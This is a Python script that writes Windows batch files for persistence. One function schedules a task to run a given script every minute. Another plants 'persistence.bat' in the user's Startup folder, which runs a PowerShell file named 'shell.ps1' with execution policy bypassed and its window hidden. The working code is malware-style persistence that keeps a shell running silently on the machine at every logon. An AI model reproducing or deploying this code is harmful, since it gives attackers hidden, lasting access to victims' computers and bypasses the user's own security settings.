# task_creator.py
import os
from username import get_username
def create_task_bat(file_path, script_path):
    

    data_to_write = f"""@echo off
schtasks /create /tn "MyTask" /tr "{script_path}" /sc minute /mo 1
"""
    try:
        with open(file_path, "w") as file:
            file.write(data_to_write)
        print(f"File created successfully at: {file_path}")
    except Exception as e:
        print(f"Error: {e}")

def create_persistence_bat():
    username = get_username()
    file_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\persistence.bat"
    print(file_path)
    data_to_write = f"""@echo off
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\\Users\\{username}\\Desktop\\shell.ps1"
"""
    print(data_to_write)
    try:
        with open(file_path, "w") as file:
            file.write(data_to_write)
        print(f"File created successfully at: {file_path}")
    except Exception as e:
        print(f"Error: {e}")


# เพื่อทดสอบฟังก์ชัน
if __name__ == "__main__":
    
    """ username = get_username()
    #location file .bat
    task_bat_path = f"C://Users//{username}//Desktop//task.bat" 
    #location file will run
    script_path = f"C://Users//{username}//Desktop//catch_me//display.py"
    
    create_task_bat(task_bat_path, script_path) """



""" # main_program.py
from task_creator import create_task_bat

if __name__ == "__main__":
    task_bat_path = r"C://Users//thantap.t//Desktop//task.bat"
    script_path = r"C:\\Users\\thantap.t\\Desktop\\gui.py"
    
    create_task_bat(task_bat_path, script_path) """